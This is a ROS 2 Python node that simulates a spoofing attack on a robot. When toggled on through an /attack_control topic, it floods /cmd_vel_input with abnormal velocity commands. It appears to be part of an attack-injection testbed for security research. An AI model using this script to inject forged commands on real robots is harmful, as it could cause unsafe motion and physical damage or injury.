import rclpy
from rclpy.node import Node
from geometry_msgs.msg import Twist
from std_msgs.msg import String


ATTACK_TYPE = 'spoofing'


class AbnormalVelocityNode(Node):
    def __init__(self):
        super().__init__('abnormal_velocity_node')

        self.active = False

        self.pub = self.create_publisher(Twist, '/cmd_vel_input', 10)
        self.ctrl_sub = self.create_subscription(
            String, '/attack_control', self.control_callback, 10)

        self.timer = self.create_timer(0.5, self.attack)
        self.get_logger().info(
            f'Spoofing (Abnormal Velocity) Node ready - idle until '
            f'"{ATTACK_TYPE}: ON" received on /attack_control')

    def control_callback(self, msg):
        cmd = parse_attack_control(msg.data)
        if cmd is None:
            return
        target, state = cmd
        if target != ATTACK_TYPE:
            return
        if state == 'ON' and not self.active:
            self.active = True
            self.get_logger().warn('SPOOFING attack: ON')
        elif state == 'OFF' and self.active:
            self.active = False
            self.get_logger().info('SPOOFING attack: OFF')

    def attack(self):
        if not self.active:
            return
        msg = Twist()
        msg.linear.x = 3.0
        msg.angular.z = 5.0
        self.pub.publish(msg)
        self.get_logger().info(f'SPOOFING: linear.x={msg.linear.x}, angular.z={msg.angular.z}')


def parse_attack_control(data):
    if ':' not in data:
        return None
    target, _, state = data.partition(':')
    target = target.strip().lower()
    state = state.strip().upper()
    if state not in ('ON', 'OFF'):
        return None
    return target, state


def main(args=None):
    rclpy.init(args=args)
    node = AbnormalVelocityNode()
    try:
        rclpy.spin(node)
    except KeyboardInterrupt:
        pass
    node.destroy_node()
    rclpy.shutdown()


if __name__ == '__main__':
    main()
